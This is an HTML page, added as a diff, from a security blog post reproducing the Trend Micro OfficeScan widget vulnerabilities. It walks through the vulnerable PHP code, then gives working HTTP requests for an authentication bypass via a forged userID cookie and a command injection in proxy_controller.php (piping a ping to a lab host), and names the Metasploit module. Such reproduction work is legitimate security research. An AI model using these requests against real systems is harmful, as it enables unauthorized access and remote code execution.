@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="多数趋势科技的产品都有管理网页的小部件(widget)。虽然使用 Java/.NET 编写的核心系统，但是这个小部件机制已经用PHP实现了。因此意味着趋势科技的产品中包含有PHP解释器。widget框架有一个代理机制，其proxy_controller.php页面根据用户输入调用相关类来实现该功能，通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过。"/>
+
+
+
+
+  <meta name="keywords" content="Trend Micro, 趋势科技" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/10/趋势科技产品Widgets模块多个漏洞复现/"/>
+
+
+<meta name="description" content="多数趋势科技的产品都有管理网页的小部件(widget)。虽然使用 Java/.NET 编写的核心系统，但是这个小部件机制已经用PHP实现了。因此意味着趋势科技的产品中包含有PHP解释器。widget框架有一个代理机制，其proxy_controller.php页面根据用户输入调用相关类来实现该功能，通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过">
+<meta name="keywords" content="Trend Micro, 趋势科技">
+<meta property="og:type" content="article">
+<meta property="og:title" content="趋势科技产品Widgets模块多个漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2017/10/趋势科技产品Widgets模块多个漏洞复现/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="多数趋势科技的产品都有管理网页的小部件(widget)。虽然使用 Java/.NET 编写的核心系统，但是这个小部件机制已经用PHP实现了。因此意味着趋势科技的产品中包含有PHP解释器。widget框架有一个代理机制，其proxy_controller.php页面根据用户输入调用相关类来实现该功能，通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg">
+<meta property="og:updated_time" content="2017-10-13T02:16:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="趋势科技产品Widgets模块多个漏洞复现">
+<meta name="twitter:description" content="多数趋势科技的产品都有管理网页的小部件(widget)。虽然使用 Java/.NET 编写的核心系统，但是这个小部件机制已经用PHP实现了。因此意味着趋势科技的产品中包含有PHP解释器。widget框架有一个代理机制，其proxy_controller.php页面根据用户输入调用相关类来实现该功能，通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过">
+<meta name="twitter:image" content="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> 趋势科技产品Widgets模块多个漏洞复现 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          趋势科技产品Widgets模块多个漏洞复现
+        
+      </h1>
+
+      <time class="post-time">
+          Oct 13 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h2><p>多数趋势科技的产品都有管理网页的小部件(widget)。虽然使用 Java/.NET 编写的核心系统，但是这个小部件机制已经用PHP实现了。因此意味着趋势科技的产品中包含有PHP解释器。<br>widget框架有一个代理机制，其proxy_controller.php页面根据用户输入调用相关类来实现该功能，通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite3未授权访问、SSRF和认证绕过。</p>
+<h2 id="0x02、漏洞分析"><a href="#0x02、漏洞分析" class="headerlink" title="0x02、漏洞分析"></a>0x02、漏洞分析</h2><p>本次复现的是命令注入和认证绕过漏洞，命令注入需要认证的情况下才能实现，因此这两个漏洞结合才能实现远程代码执行。</p>
+<h4 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a>2.1 环境搭建</h4><p>趋势产品：防毒墙-网络版(OfficeScan) 11.0 Build: 1744.00 (<a href="http://downloadcenter.trendmicro.com/index.php?regs=CH&amp;clk=latest&amp;clkval=4661&amp;lang_loc=15" target="_blank" rel="external">http://downloadcenter.trendmicro.com/index.php?regs=CH&amp;clk=latest&amp;clkval=4661&amp;lang_loc=15</a>)<br>操作系统：Windows10</p>
+<p>官网下载OfficeScan最新版本(未打补丁)，安装前需要开启Windows的IIS服务，不然会一直出错。<br>激活码：OS-5LCX-EAZPE-9UZVU-QGZMF-N765A-LRJNF<br>激活提示错误不管，可以正常安装使用。安装完成后默认WEB控制台如下：</p>
+<ul>
+<li><a href="http://127.0.0.1:8080/officescan/console/html/cgi/cgiChkMasterPwd.exe" target="_blank" rel="external">http://127.0.0.1:8080/officescan/console/html/cgi/cgiChkMasterPwd.exe</a></li>
+<li><a href="https://127.0.0.1:4343/officescan/console/html/cgi/cgiChkMasterPwd.exe" target="_blank" rel="external">https://127.0.0.1:4343/officescan/console/html/cgi/cgiChkMasterPwd.exe</a></li>
+</ul>
+<h4 id="2-2-命令注入"><a href="#2-2-命令注入" class="headerlink" title="2.2 命令注入"></a>2.2 命令注入</h4><p>首先来看<code>Trend Micro\OfficeScan\PCCSRV\Web_OSCE\Web_console\HTML\widget\repository\widgets_new\proxy\modTMCSS\Proxy.php</code>文件代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">proxy_exec</span><span class="params">()</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="comment">// localhost, directly launch report.php</span></div><div class="line">  <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cgiArgs[<span class="string">'serverid'</span>] == <span class="string">'1'</span>)</div><div class="line">  &#123;</div><div class="line">          <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;cgiArgs[<span class="string">'type'</span>] == <span class="string">"WR"</span>)&#123;</div><div class="line">              $cmd = <span class="string">"php ../php/lwcs_report.php "</span>;</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"t"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"tr"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"ds"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"m"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"C"</span>);</div><div class="line">              exec($cmd, <span class="keyword">$this</span>-&gt;m_output, $error);</div><div class="line">              <span class="keyword">if</span> ($error != <span class="number">0</span>)</div><div class="line">              &#123;</div><div class="line">                  <span class="keyword">$this</span>-&gt;errCode = WF_PROXY_ERR_EXEC_OTHERS;</div><div class="line">                  <span class="keyword">$this</span>-&gt;errMessage = <span class="string">"exec lwcs_report.php failed. err = $error"</span>;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          <span class="keyword">else</span>&#123;        </div><div class="line">              $cmd = <span class="string">"php ../php/report.php "</span>;</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"T"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"D"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"IP"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"M"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"TOP"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"C"</span>);</div><div class="line">              <span class="keyword">$this</span>-&gt;AddParam($cmd, <span class="string">"CONSOLE_LANG"</span>);</div><div class="line">              exec($cmd, <span class="keyword">$this</span>-&gt;m_output, $error);</div><div class="line">              <span class="keyword">if</span> ($error != <span class="number">0</span>)</div><div class="line">              &#123;</div><div class="line">                  <span class="keyword">$this</span>-&gt;errCode = WF_PROXY_ERR_EXEC_OTHERS;</div><div class="line">                  <span class="keyword">$this</span>-&gt;errMessage = <span class="string">"exec report.php failed. err = $error"</span>;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">AddParam</span><span class="params">(&amp;$cmd, $param)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cgiArgs[$param]))</div><div class="line">  &#123;</div><div class="line">    $cmd = $cmd.$param.<span class="string">"="</span>.<span class="keyword">$this</span>-&gt;cgiArgs[$param].<span class="string">" "</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以很直观看到cgiArgs[]处内容被带入了exec()函数被执行，执行代码类似<code>exec(&quot;php ../php/lwcs_report.php t=xx tr=xx...&quot;)</code>.</p>
+<p>此处需要控制传入的参数即可，再来看<code>\Trend Micro\OfficeScan\PCCSRV\Web_OSCE\Web_console\HTML\widget\proxy_controller</code>文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($g_GetPost))&#123;</div><div class="line">    $g_GetPost = array_merge($_GET,$_POST);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    $g_GetPost = array_merge($g_GetPost,$_GET,$_POST);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//...</span></div><div class="line"></div><div class="line">$myproxy_file = $strProxyDir . <span class="string">"/"</span> . $server_module . <span class="string">"/Proxy.php"</span>;</div><div class="line"><span class="comment">//null byte injection prevents</span></div><div class="line"><span class="keyword">if</span>( is_string( $myproxy_file ) ) &#123;</div><div class="line">    $myproxy_file = str_replace( <span class="string">"\0"</span>, <span class="string">''</span>, $myproxy_file );</div><div class="line">&#125;</div><div class="line">            </div><div class="line"><span class="comment">// does file exist?</span></div><div class="line"><span class="keyword">if</span>(file_exists($myproxy_file))&#123;</div><div class="line">    <span class="keyword">include</span> ($myproxy_file);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    proxy_error(WF_PROXY_ERR_INIT_INVALID_MODULE, WF_PROXY_ERR_INIT_INVALID_MODULE_MSG);</div><div class="line">&#125;</div><div class="line"><span class="comment">// does class exist?</span></div><div class="line"><span class="keyword">if</span>(! class_exists(<span class="string">"WFProxy"</span>))&#123;</div><div class="line">    proxy_error(WF_PROXY_ERR_INIT_MODULE_ERROR, WF_PROXY_ERR_INIT_MODULE_ERROR_MSG);</div><div class="line">&#125;</div><div class="line"><span class="comment">// ... CODE OMIT ...</span></div><div class="line">$request = <span class="keyword">new</span> WFProxy($g_GetPost, $wfconf_dbconfig);</div><div class="line">$request-&gt;proxy_exec();</div><div class="line">$request-&gt;proxy_output();</div></pre></td></tr></table></figure></p>
+<p>以上代码将<code>$_GET</code>,<code>$_POST</code>合并成<code>$g_GetPost</code>，并将其传入<code>$myproxy_file</code>,即我们所选的<code>Trend Micro\OfficeScan\PCCSRV\Web_OSCE\Web_console\HTML\widget\repository\widgets_new\proxy\modTMCSS\Proxy.php</code>文件。(其实这里可以选择多个WFProxy类，在<code>Trend Micro\OfficeScan\PCCSRV\Web_OSCE\Web_console\HTML\widget\repository\widgets_new\peoxy</code>下可以看到多个WFProxy类的定义。),到此，我们只需要对<code>proxy_controller.php</code>的<code>$_POST</code>进行操作，即可传入所调用的WFProxy类并执行<code>exec(&quot;php ../php/lwcs_report.php t=$_POST[p1],tr=$_POST[p2]...&quot;)</code>，从而实现了命令注入。<br>通过代码<code>require_once (dirname(__FILE__) . &quot;/inc/session_auth.php&quot;);</code>可以看到该页面需要认证，未认证情况下无法实现命令注入，因此还需要下面认证绕过的漏洞来实现。</p>
+<h4 id="2-2-认证绕过"><a href="#2-2-认证绕过" class="headerlink" title="2.2 认证绕过"></a>2.2 认证绕过</h4><p>查看认证页面<code>/officescan/console/html/widget/ui/modLogin/talker.php</code>代码发现认证调用standalone_user_init()函数，部分代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">standalone_user_init</span><span class="params">()</span></span>&#123;</div><div class="line">    mydebug_log(<span class="string">"[WFUSER] standalone_user_init()"</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'userID'</span>]))&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;recover_session_byuid($_COOKIE[<span class="string">'userID'</span>]);</div><div class="line">    &#125;</div><div class="line">    mydebug_log(<span class="string">"[WFUSER] standalone_user_init(): cookie userID isn't set"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">recover_session_byuid</span><span class="params">($uid)</span></span>&#123;</div><div class="line">    mydebug_log(<span class="string">"[WFUSER] recover_session_byuid() "</span> . $uid);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">false</span> == <span class="keyword">$this</span>-&gt;loaduser_byuid($uid))&#123;</div><div class="line">        mydebug_log(<span class="string">"[WFUSER] recover_session_byuid() failed"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;recover_session();</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loaduser_byuid</span><span class="params">($uid)</span></span>&#123;</div><div class="line">    mydebug_log(<span class="string">"[WFUSER] loaduser_byuid() "</span> . $uid);</div><div class="line">    <span class="comment">// load user</span></div><div class="line">    $uinfolist = <span class="keyword">$this</span>-&gt;userdb-&gt;get_users($uid);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;userdb-&gt;isFailed())&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// no exists</span></div><div class="line">    <span class="keyword">if</span>(! <span class="keyword">isset</span>($uinfolist[<span class="number">0</span>]))&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// get userinfo</span></div><div class="line">    <span class="keyword">$this</span>-&gt;userinfo = $uinfolist[<span class="number">0</span>];</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_users</span><span class="params">($uid = null)</span></span>&#123;</div><div class="line">    <span class="comment">// specify uid</span></div><div class="line">    $work_uid = <span class="keyword">$this</span>-&gt;valid_uid($uid);</div><div class="line">    <span class="keyword">if</span>($work_uid == <span class="keyword">null</span>)&#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// query string</span></div><div class="line">    $sqlstring = <span class="string">'SELECT * from '</span> . <span class="keyword">$this</span>-&gt;users_table . <span class="string">' WHERE id = :uid'</span>;</div><div class="line">    $sqlvalues[<span class="string">':uid'</span>] = $work_uid;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runSQL($sqlstring, $sqlvalues, <span class="string">"Get "</span> . <span class="keyword">$this</span>-&gt;users_table . <span class="string">" failed"</span>, <span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到此处认证过程中仅验证用户id或用户名，并未去校验CSRFToken和hash字段。</p>
+<h2 id="0x03、漏洞利用"><a href="#0x03、漏洞利用" class="headerlink" title="0x03、漏洞利用"></a>0x03、漏洞利用</h2><h4 id="3-1、认证绕过"><a href="#3-1、认证绕过" class="headerlink" title="3.1、认证绕过"></a>3.1、认证绕过</h4><p>首先访问如下请求获取返回头中<code>Set-Cookie</code>值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET /officescan/console/html/widget/index.php HTTP/1.1</div><div class="line">Host: 10.211.55.18:8080</div></pre></td></tr></table></figure></p>
+<p>通过上述分析，构造如下HTTP请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST /officescan/console/html/widget/ui/modLogin/talker.php HTTP/1.1</div><div class="line">Host: 10.211.55.18:8080</div><div class="line">Cookie: LogonUser=root; userID=1; PHPSESSID=51krh5n4d80npijguclead4fc6;</div><div class="line">X-CSRFToken: 51krh5n4d80npijguclead4fc6</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 28</div><div class="line">Connection: close</div><div class="line"></div><div class="line">cid=1&amp;act=check&amp;hash=1&amp;pid=1</div></pre></td></tr></table></figure></p>
+<p>其中<code>X-CSRFToken</code>和<code>PHPSESSID</code>为上步<code>Set-Cookie</code>值，查看响应包可以看到成功认证，包含<code>&quot;message&quot;:&quot;login successfully&quot;</code>内容。</p>
+<h4 id="3-2、命令注入"><a href="#3-2、命令注入" class="headerlink" title="3.2、命令注入"></a>3.2、命令注入</h4><p>将上步通过认证的X-CSRFToken和Cookie带入包含命令注入的HTTP请求中，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST /officescan/console/html/widget/proxy_controller.php HTTP/1.1</div><div class="line">Host: 10.211.55.18:8080</div><div class="line">Cookie: LANG=en_US; LogonUser=root; userID=1; PHPSESSID=51krh5n4d80npijguclead4fc6;</div><div class="line">X-CSRFToken: 51krh5n4d80npijguclead4fc6</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 54</div><div class="line"></div><div class="line">module=modTMCSS&amp;serverid=1&amp;TOP=1|ping 10.211.55.2</div></pre></td></tr></table></figure></p>
+<p>在<code>10.211.55.2</code>上执行<code>tcpdump icmp</code>接收icmp包验证执行情况，可以看到<br>命令成功执行：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg" alt="2A54F323032F5F989BA06B7A11056317.jpg"></p>
+<h2 id="3-3、Metasploit脚本"><a href="#3-3、Metasploit脚本" class="headerlink" title="3.3、Metasploit脚本"></a>3.3、Metasploit脚本</h2><p>Metasploit 已经集成该漏洞EXP，路径为<code>exploit/windows/http/trendmicro_officescan_widget_exec</code>,直接调用如下：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg" alt="D94BF9C93696AFF86DC5D8C32432DC4C.jpg"></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/vuln/">vuln</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/09/CVE-2017-8759-复现/">
+        <span class="next-text nav-default">CVE-2017-8759 复现</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
